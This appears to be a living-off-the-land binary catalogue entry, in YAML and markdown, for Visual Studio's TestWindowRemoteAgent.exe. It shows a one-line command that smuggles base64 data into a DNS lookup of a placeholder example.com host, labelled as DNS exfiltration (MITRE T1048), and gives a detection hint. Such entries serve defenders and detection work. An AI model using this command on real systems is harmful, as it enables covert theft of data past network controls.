---
Acknowledgement:
- Person: Onat Uzunya
Author: Onat Uzunyayla
Commands:
- Category: Upload
  Command: TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
  Description: Sends DNS query for open connection to any host, enabling exfiltration
    over DNS
  MitreID: T1048
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Attackers may utilize this to exfiltrate data over DNS
Created: 2023-08-21
Description: TestWindowRemoteAgent.exe is the command-line tool to establish RPC
Detection:
- IOC: TestWindowRemoteAgent.exe spawning unexpectedly
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe
Name: TestWindowRemoteAgent.exe
mitre_data:
  technique_ids:
  - T1048
tags:
- lolbas/othermsbinaries
---

# TestWindowRemoteAgent.exe

TestWindowRemoteAgent.exe is the command-line tool to establish RPC

# Path(s)

- `C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TestWindow\RemoteAgent\TestWindowRemoteAgent.exe`

# Upload Commands

Sends DNS query for open connection to any host, enabling exfiltration over DNS

```batch
TestWindowRemoteAgent.exe start -h {your-base64-data}.example.com -p 8000
```

- **Usecase:** Attackers may utilize this to exfiltrate data over DNS
- **Privileges Required:** User
- **MitreID:** `T1048`
- **Operating System(s):** Windows 10, Windows 11


# Acknowledgements

- Onat Uzunyayla (Authored, 2023-08-21)
- Onat Uzunya